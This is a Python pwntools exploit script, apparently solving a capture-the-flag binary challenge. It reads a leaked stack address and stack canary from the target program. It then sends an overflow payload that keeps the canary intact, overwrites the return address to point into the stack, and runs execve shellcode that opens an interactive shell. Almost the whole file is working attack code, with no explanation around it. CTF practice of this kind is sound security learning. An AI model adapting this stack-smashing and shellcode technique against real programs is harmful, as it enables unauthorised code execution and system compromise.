from pwn import * 

binary = "./program"
context.arch = 'amd64'
p = process(binary)
#p = remote("chal.firebird.sh", 35028)
context.log_level = 'debug'
s = 'b* UwU_main+546'
gdb.attach(p, s)
p.recvuntil("0x")
leak_addr = int(b'0x' + p.recvuntil(b' ', drop = True), 16)
shellcode_addr = leak_addr + 0x18 + 8 + 8
p.recvuntil("0x")
canary = int(b'0x' + p.recvuntil(b' ', drop = True), 16)

#print(hex(canary))
p.sendlineafter("how long is your shellcode?", b'48')

shellcode_addr = leak_addr + 0x18 + 8 + 8   

print(f"Leaked address: {hex(leak_addr)}")
print(f"Canary: {hex(canary)}")

                            
shellcode1 = asm("""
xor rsi, rsi            
xor rdx, rdx            
mov rdi, rcx            
mov al, 0x3b            
syscall                
""")   



shellcode_addr = leak_addr + 0x18 + 8 + 8 # leak_addr is rbp-0x18
payload = b'/bin/sh\x00' # 8 bytes from rbp_0x10 to canary
payload += p64(canary) # perserving canary
payload += b'BBBBBBBB'
payload += p64(shellcode_addr)
payload += shellcode1

p.sendlineafter("I'm looking forward to seeing its full potential!", payload)
p.interactive()